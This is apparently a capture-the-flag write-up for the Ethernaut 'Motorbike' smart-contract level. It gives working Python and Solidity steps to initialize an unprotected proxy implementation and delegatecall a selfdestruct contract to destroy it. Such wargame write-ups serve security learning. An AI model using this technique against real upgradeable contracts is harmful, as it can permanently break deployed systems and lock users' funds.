# Motorbike

## Objectives

Would you be able to `selfdestruct` its engine and make the motorbike unusable ?

## Solution

The Engine contract inherits from Initializable, which means the initializer function is restricted to be called once. However, because the Engine is the implementation and Motorbike is the proxy, the initializer modifier doesn't restrict EOAs or other contracts from calling the `initialize()` function and through `upgradeToAndCall()` effectively passing any call to the implementation. The call is passed through the `_upgradeToAndCall()` function in a `delegatecall`, this way we just deploy a malicious contract with `selfdestruct()` call in a function and call this function as if the caller was the engine contract.

The steps to reproduce it are simple:

1. Get the address of the Engine implementation, as defined in Motorbike identical to how they're usually defined in an Upgradeable Proxy contract
   
2. Call the `initialize()` function to become `upgrader` and be able to pass calls to the `_authorizeUpgrade()` function

3. Deploy a malicious contract with a single function that can self destruct the contract.

4. Call the function that would normally self destructs the malicious contract through a `delegatecall` in `upgradeToAndCall()` in the Engine contract by passing in the malicious contract address as `newImplementation` and the data that would call the function as `data`. After this, the Engine implementation contract will be destroyed.

## How I did it

1. Find the implementation address of the Engine contract

```python
# find engine contract implementation
storage_position_impl_address = hex(int(web3.sha3(text='eip1967.proxy.implementation').hex(),16)-1)
implementation_address = f'0x{web3.eth.get_storage_at(motorbike.address, storage_position_impl_address).hex()[-40:]}'

# load Engine contract
eg = Engine.at(implementation_address)
```

2. Call `initialize()` in the Engine contract

```python
# initialize the engine implementation
eg.initialize(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x79c0e38730d584e33f5e291452c09ae91542f349bd8772dedf451b4d58b3275a

3. Deploy a BombEngine contract (at: `0x89a05702875f0c18FF5B28640ea3DdE39FDe6E47`) with only a single function that can self destruct such contract

```cs
function boom() public {
    selfdestruct(address(0));
}
```

```python
# deploy our bomb engine contract
be = BombEngine.deploy(_from)
```
4. Call `UpgradeToAndCall()` in the Engine implementation contract as described in [solution](#solution).

```python
# call upgradeToAndCall() to selfdestruct the Engine implementation contract
selfdestruct_call = be.boom.encode_input()
eg.upgradeToAndCall(be.address, selfdestruct_call, _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x93e405003cb3065ae97a1c2d493eeba85a9b5f85f1db6b4fa0d27f3847ee23b6

5. Confirm that the contract has been successfully destroyed by checking if we can call the getter function for one of the state variables, in this case `upgrader()`

```python
try:
    # call the getter function
    eg.upgrader()

    # print if it didnt fail
    print('The contract was not successfully self destructed')

    # return that it failed
    return False
except:
    # print if it failed
    print('The contract was successfully self destructed')
    
    # return that it succeeded
    return True
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0xbc0466a3268b594bb4c1273a022e188c359a0d26c379ee265f5a095ea17b0fce
